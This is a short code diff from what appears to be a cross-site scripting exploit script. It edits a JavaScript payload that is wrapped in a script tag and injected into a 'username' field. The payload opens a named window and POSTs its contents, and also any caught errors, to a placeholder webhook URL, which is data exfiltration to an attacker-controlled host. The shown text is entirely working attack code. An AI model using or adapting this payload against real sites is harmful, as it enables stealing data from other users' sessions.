@@ -34,9 +34,11 @@ try {
   const profile = window.open("", "${OPEN}");
   let xhr = new XMLHttpRequest();
   xhr.open("POST", "${WEBHOOK}", false);
-  xhr.send(profile.document.body.innerText);
+  xhr.send(profile);
 } catch (error) {
-  get("${WEBHOOK}?" + error);
+  let xhr = new XMLHttpRequest();
+  xhr.open("POST", "${WEBHOOK}", false);
+  xhr.send(error);
 }
 `;
   document.getElementById("username").value = `<script>${payload}</script>`;
